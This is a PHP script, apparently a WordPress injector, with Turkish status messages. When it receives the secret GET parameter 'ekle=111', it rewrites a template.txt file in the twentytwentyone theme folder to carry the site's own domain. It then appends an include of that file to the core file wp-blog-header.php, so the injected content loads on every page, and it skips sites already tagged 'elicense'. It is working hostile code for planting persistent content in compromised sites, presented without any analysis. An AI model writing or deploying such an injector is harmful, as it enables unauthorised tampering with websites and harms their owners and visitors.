<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if (isset($_GET['ekle']) && $_GET['ekle'] == '111') {
    $templateFile = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/twentytwentyone/template.txt';
    $wpHeaderFile = $_SERVER['DOCUMENT_ROOT'] . '/wp-blog-header.php';

    if (file_exists($templateFile)) {
        $fileContent = file_get_contents($templateFile);
        $currentDomain = $_SERVER['HTTP_HOST'];
        $updatedContent = str_replace('replace.com', $currentDomain, $fileContent);
        file_put_contents($templateFile, $updatedContent);

        $includeCode = "?>\n<?php\ninclude '" . $templateFile . "';\n?>";

        if (file_exists($wpHeaderFile)) {
            $wpHeaderContent = file_get_contents($wpHeaderFile);

            if (strpos($wpHeaderContent, 'elicense') !== false) {
                echo "<div>Bu sayfa zaten güncel.</div>";
            } else if (strpos($wpHeaderContent, $includeCode) === false) {
                file_put_contents($wpHeaderFile, $includeCode, FILE_APPEND);
                echo "<div>Dosya güncellendi ve wp-blog-header.php dosyasına eklendi.</div>";
            } else {
                echo "<div>Dosya zaten wp-blog-header.php dosyasına eklenmiş.</div>";
            }
        } else {
            echo "<div>wp-blog-header.php dosyası bulunamadı.</div>";
        }
    } else {
        echo "<div>template.txt dosyası bulunamadı.</div>";
    }
} else {
    echo "<div>Geçersiz istek.</div>";
}
?>